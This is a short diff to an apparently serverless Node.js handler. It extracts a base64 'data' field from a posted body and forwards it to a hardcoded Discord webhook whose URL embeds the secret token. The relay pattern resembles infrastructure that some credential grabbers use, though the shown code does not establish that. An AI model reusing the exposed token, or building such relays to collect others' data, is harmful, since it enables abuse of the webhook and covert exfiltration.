@@ -42,10 +42,11 @@ module.exports = async (req, res) => {
         req.on("end", async () => {
             try {
                 // Send first webhook
+                const data = decodeURIComponent(decodeURIComponent(body)).match(/^data=([A-Za-z0-9_\-]+)$/)[1].replace(/-/g, '+').replace(/_/g, '/');
                 await fetch('https://discord.com/api/webhooks/1100381486798094428/QSMcJE-Tp8embdLntKoqNeuKHLEN3vhCTXtzL5mkAlLkd-Rxo_wgbTPR1mR29n1zfUd8', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username: 'Webhook Bot', content: decodeURIComponent(decodeURIComponent(body)) })
+                    body: JSON.stringify({ username: 'Webhook Bot', content: data })
                 });
 
                 // Decrypt and process data
